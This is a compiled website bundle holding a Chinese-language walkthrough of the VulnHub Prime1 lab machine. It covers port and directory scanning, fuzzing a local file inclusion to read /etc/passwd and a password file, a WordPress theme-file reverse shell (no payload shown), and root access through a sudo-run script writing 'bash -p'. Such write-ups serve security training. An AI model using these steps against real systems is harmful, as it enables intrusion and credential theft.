"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[871],{8093:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>o,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"VulnHub/Virtual Machines/Prime1","title":"Prime1","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/Prime1.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Prime1","permalink":"/docs/VulnHub/Virtual Machines/Prime1","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Prime1.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Pinkys Palace v2","permalink":"/docs/VulnHub/Virtual Machines/Pinkys Palace v2"},"next":{"title":"RickdiculouslyEasy","permalink":"/docs/VulnHub/Virtual Machines/RickdiculouslyEasy"}}');var s=r(4848),a=r(8453);const o={},i=void 0,c={},l=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"port-scan",children:"port scan"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Tue Feb  4 08:27:39 2025 as: nmap -sT -sVC -O -p22,80 -oN nmap_result/detils 192.168.28.23\r\nNmap scan report for 192.168.28.23 (192.168.28.23)\r\nHost is up (0.0020s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)\r\n|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)\r\n|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)\r\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\r\n|_http-title: HacknPentest\r\n|_http-server-header: Apache/2.4.18 (Ubuntu)\r\nMAC Address: 00:0C:29:C0:1C:27 (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsx)(n.h2,{id:"web",children:"web"}),"\n",(0,s.jsx)(n.p,{children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"dirsearch -u http://192.168.28.23\r\n[00:31:56] 200 -  131B  - /dev\r\n[00:32:01] 200 -  137B  - /image.php\r\n[00:32:02] 301 -  319B  - /javascript  ->  http://192.168.28.23/javascript/\r\n[00:32:24] 200 -    4KB - /wordpress/\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"dirb http://192.168.28.23/ -X .txt,.zip,.html,.tar\r\n\r\n-----------------\r\nDIRB v2.22    \r\nBy The Dark Raver\r\n-----------------\r\n\r\nSTART_TIME: Wed Feb  5 00:33:11 2025\r\nURL_BASE: http://192.168.28.23/\r\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\r\nEXTENSIONS_LIST: (.txt,.zip,.html,.tar) | (.txt)(.zip)(.html)(.tar) [NUM = 4]\r\n\r\n-----------------\r\n\r\nGENERATED WORDS: 4612                                                          \r\n\r\n---- Scanning URL: http://192.168.28.23/ ----\r\n+ http://192.168.28.23/secret.txt (CODE:200|SIZE:412)\r\n-----------------\r\nEND_TIME: Wed Feb  5 00:33:24 2025\r\nDOWNLOADED: 18448 - FOUND: 1\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"gobuster dir -u http://192.168.28.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php\r\n/index.php            (Status: 200) [Size: 136]\r\n/image.php            (Status: 200) [Size: 147]\r\n/wordpress            (Status: 301) [Size: 318] [--\x3e http://192.168.28.23/wordpress/]\r\n/dev                  (Status: 200) [Size: 131]\r\n/javascript           (Status: 301) [Size: 319] [--\x3e http://192.168.28.23/javascript/]\r\n/secret.txt           (Status: 200) [Size: 412]\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"dev"}),"\u6587\u4ef6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"hello,\r\nnow you are at level 0 stage.\r\nIn real life pentesting we should use our tools to dig on a web very hard.\r\nHappy hacking. \n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"secret.txt"}),"\u6587\u4ef6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Looks like you have got some secrets.\r\n\r\nOk I just want to do some help to you. \r\n\r\nDo some more fuzz on every page of php which was finded by you. And if\r\nyou get any right parameter then follow the below steps. If you still stuck \r\nLearn from here a basic tool with good usage for OSCP.\r\n\r\nhttps://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web\r\n\r\n//see the location.txt and you will get your next move//\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u6bcf\u4e2aphp\u9875\u9762\u8fdb\u884c\u6a21\u7cca\u6d4b\u8bd5"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/Prime1]\r\n\u2514\u2500$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.28.23/index.php?FUZZ=location.txt\r\n********************************************************\r\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\r\n********************************************************\r\n\r\nTarget: http://192.168.28.23/index.php?FUZZ=location.txt\r\nTotal requests: 951\r\n\r\n=====================================================================\r\nID           Response   Lines    Word       Chars       Payload                                                                                                  \r\n=====================================================================\r\n\r\n000000341:   200        8 L      42 W       334 Ch      "file"                                                                                                   \r\n\r\nTotal time: 0\r\nProcessed Requests: 951\r\nFiltered Requests: 950\r\nRequests/sec.: 0\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"http://192.168.28.23/index.php?file=location.txt",children:"http://192.168.28.23/index.php?file=location.txt"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Do something better\r\n\r\nok well Now you reah at the exact parameter\r\n\r\nNow dig some more for next one\r\nuse 'secrettier360' parameter on some other php page for more fun. \n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"http://192.168.28.23/image.php?secrettier360=/etc/passwd",children:"http://192.168.28.23/image.php?secrettier360=/etc/passwd"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"syslog:x:104:108::/home/syslog:/bin/false\r\nvictor:x:1000:1000:victor,,,:/home/victor:/bin/bash\r\nsaket:x:1001:1001:find password.txt file in my directory:/home/saket:\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"find password.txt file in my directory"})}),"\n",(0,s.jsxs)(n.p,{children:["saket\u5bb6\u76ee\u5f55\u6709",(0,s.jsx)(n.code,{children:"password.txt"}),",\u5c1d\u8bd5\u8bfb\u53d6"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"http://192.168.28.23/image.php?secrettier360=/home/saket/password.txt",children:"http://192.168.28.23/image.php?secrettier360=/home/saket/password.txt"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"finaly you got the right parameter\r\n\r\nfollow_the_ippsec\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5bc6\u7801\uff1a",(0,s.jsx)(n.code,{children:"follow_the_ippsec"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"\u767b\u5f55wordpress"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ea\u6709",(0,s.jsx)(n.code,{children:"secret.php"}),"\u53ef\u4ee5\u7f16\u8f91"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205134405032.png",alt:"image-20250205134405032"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"http://192.168.28.23/wordpress/wp-content/themes/twentynineteen/secret.php",children:"http://192.168.28.23/wordpress/wp-content/themes/twentynineteen/secret.php"})}),"\n",(0,s.jsx)(n.p,{children:"\u53cd\u5f39shell"}),"\n",(0,s.jsx)(n.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"www-data@ubuntu:/home/saket$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for www-data on ubuntu:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser www-data may run the following commands on ubuntu:\r\n    (root) NOPASSWD: /home/saket/enc\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd0\u884cenc\uff0c\u9700\u8981\u8f93\u5165\u5bc6\u7801"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"www-data@ubuntu:/home/saket$ sudo /home/saket/enc\r\nsudo /home/saket/enc\r\nenter password: 11\r\n11\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u7cfb\u7edf\u4e2d\u641c\u7d22\u5bc6\u7801\u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"find / -perm -u=s -type f 2>/dev/null\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"/opt/backup/server_database/backup_pass\r\n/home/saket/password.txt\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'www-data@ubuntu:/home/saket$ cat /opt/backup/server_database/backup_pass\r\nyour password for backup_database file enc is \r\n\r\n"backup_password"\r\n\r\nEnjoy!\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u627e\u5230enc\u6587\u4ef6\u7684\u5bc6\u7801"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"www-data@ubuntu:/home/saket$ sudo /home/saket/enc\r\nenter password: backup_password\r\nbackup_password\r\ngood\r\nwww-data@ubuntu:/home/saket$ ls\r\nenc  enc.txt  key.txt  password.txt  user.txt\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u751f\u6210\u4e86",(0,s.jsx)(n.code,{children:"enc.txt key.txt"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'www-data@ubuntu:/home/saket$ cat enc.txt\r\nnzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=\r\nwww-data@ubuntu:/home/saket$ cat key.txt\r\nI know you are the fan of ippsec.\r\n\r\nSo convert string "ippsec" into md5 hash and use it to gain yourself in your real form.\n'})}),"\n",(0,s.jsxs)(n.p,{children:["ippsec\u5b57\u7b26\u7684md5\u7684hash\u662fkey\uff1a",(0,s.jsx)(n.code,{children:"366a74cb3c959de17d61db30591c39d1"})]}),"\n",(0,s.jsx)(n.p,{children:"AES\u89e3\u5bc6"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205135434172.png",alt:"image-20250205135434172"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'Dont worry saket one day we will reach to\r\nour destination very soon. And if you forget \r\nyour username then use your old password\r\n==> "tribute_to_ippsec"\r\n\r\nVictor,\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u62ff\u5230\u5bc6\u7801\uff1a",(0,s.jsx)(n.code,{children:"tribute_to_ippsec"}),",\u5207\u6362\u5230saket\u7528\u6237"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"www-data@ubuntu:/home/saket$ su saket\r\nsu saket\r\nPassword: tribute_to_ippsec\r\n\r\nsaket@ubuntu:~$ whoami\r\nwhoami\r\nsaket\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"saket@ubuntu:~$ sudo -l\r\nsudo -l\r\nMatching Defaults entries for saket on ubuntu:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser saket may run the following commands on ubuntu:\r\n    (root) NOPASSWD: /home/victor/undefeated_victor\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"sudo /home/victor/undefeated_victor\r\nif you can defeat me then challenge me in front of you\r\n/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u65b0\u5efa",(0,s.jsx)(n.code,{children:"/tmp/challenge"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"saket@ubuntu:~# sudo /home/victor/undefeated_victor\r\nif you can defeat me then challenge me in front of you\r\n/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: Permission denied\r\nsaket@ubuntu:~# echo 'bash -p' > /tmp/challenge\r\nsaket@ubuntu:~# chmod +x /tmp/challenge\r\nsaket@ubuntu:~# sudo /home/victor/undefeated_victor\r\nif you can defeat me then challenge me in front of you\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@ubuntu:/root# ls\r\nenc  enc.cpp  enc.txt  key.txt  root.txt  sql.py  t.sh  wfuzz  wordpress.sql\r\nroot@ubuntu:/root# cat root.txt\r\nb2b17036da1de94cfb024540a8e7075a\n"})})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>o,x:()=>i});var t=r(6540);const s={},a=t.createContext(s);function o(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);